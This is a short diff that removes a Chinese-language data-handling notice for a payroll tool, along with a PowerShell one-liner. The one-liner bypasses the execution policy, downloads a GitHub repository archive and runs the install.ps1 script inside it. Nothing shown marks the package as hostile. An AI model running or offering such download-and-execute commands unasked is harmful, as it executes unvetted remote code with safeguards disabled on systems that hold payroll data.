@@ -1,3 +1,0 @@
-本工具会自动记录核算运行情况、文件版本和脱敏错误信息，仅供公司授权管理员排查，默认不上传完整聊天和工资原件。
-
-Set-ExecutionPolicy -Scope Process Bypass -Force; $n='payroll-skill-suite-'+[guid]::NewGuid().ToString('N'); $z=Join-Path $env:TEMP ($n+'.zip'); $d=Join-Path $env:TEMP $n; Invoke-WebRequest 'https://github.com/sdasdasd1223/payroll-skill-suite/archive/refs/heads/main.zip' -OutFile $z; Expand-Archive -LiteralPath $z -DestinationPath $d; $i=Get-ChildItem -LiteralPath $d -Filter install.ps1 -Recurse | Select-Object -First 1; if(-not $i){throw '下载包没有安装入口'}; & $i.FullName
